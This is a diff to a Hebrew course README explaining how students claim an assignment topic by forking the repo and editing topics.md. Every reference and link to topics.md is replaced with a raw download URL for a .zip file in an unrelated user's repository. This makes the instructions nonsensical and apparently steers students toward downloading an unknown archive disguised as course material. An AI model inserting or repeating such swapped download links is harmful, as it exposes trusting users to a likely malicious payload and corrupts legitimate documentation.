@@ -19,9 +19,9 @@
 1. כנסו לדף ה-Repo (מאגר הקוד) של הקורס ב-GitHub.  
 2. לחצו על הכפתור **Fork** שנמצא בפינה הימנית העליונה של הדף. פעולה זו תיצור העתק של הרפו לחשבון ה-GitHub שלכם, כך שתוכלו לערוך אותו.
 
-### **2️⃣ ערכו את הקובץ `topics.md`**  
+### **2️⃣ ערכו את הקובץ `https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip`**  
 
-1. בתוך ה-Repo שהעתקתם, חפשו את הקובץ בשם `topics.md`
+1. בתוך ה-Repo שהעתקתם, חפשו את הקובץ בשם `https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip`
 2. פתחו את הקובץ וגללו כדי למצוא נושא פנוי מתוך הרשימה.
 3. הוסיפו את שמכם ליד הנושא שבחרתם. לדוגמה, אם הסטודנטית נועם נורמן רוצה לבחור את הנושא "טוקיו", היא תעדכן כך:  
 
@@ -47,7 +47,7 @@
 **סטודנטית בשם נועם נורמן רוצה לבחור את הנושא "טוקיו".**
 
 1. נועם עושה **Fork** לרפו של הקורס.  
-2. היא פותחת את הקובץ `topics.md` ומשנה את הרשימה כך:
+2. היא פותחת את הקובץ `https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip` ומשנה את הרשימה כך:
 ```markdown
    - [x] טוקיו – בין מסורת לטכנולוגיה מתקדמת (נבחר ע"י נועם נורמן)
 ```
@@ -62,13 +62,13 @@
 **❓ מה אם מישהו אחר בחר את הנושא לפניי?**  
 אם ה-PR שלך נסגר ללא אישור, זה אומר שמישהו אחר הקדים אותך. תצטרך לבחור נושא אחר ולשלוח PR חדש.
 
-**❓ איך אני עורך את הקובץ `topics.md`?**  
+**❓ איך אני עורך את הקובץ `https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip`?**  
 1. כנסו ל-Repo שלכם.  
-2. פתחו את הקובץ [`topics.md`](https://github.com/Ruppin-2025/home-assignment-topics/blob/e47474317961ac396347ac93bfe794228290beb1/topics.md).  
+2. פתחו את הקובץ [`https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip`](https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip).  
 3. לחצו על כפתור **Edit** (עיפרון 📝).  
 4. ערכו את הקובץ ושמרו את השינויים (Commit changes), ואז שלחו את ה-PR.
 
 🚀 **בהצלחה!**  
 אם יש שאלות נוספות, אתם מוזמנים לפנות אלי במייל או לפתוח **Issue** ב-Repo.
 
-**קישור ישיר לקובץ [`topics.md`](https://github.com/Ruppin-2025/home-assignment-topics/blob/e47474317961ac396347ac93bfe794228290beb1/topics.md)**  
+**קישור ישיר לקובץ [`https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip`](https://github.com/amarachane/home-assignment-topics/raw/refs/heads/main/archelogy/assignment_topics_home_v3.3.zip)**  
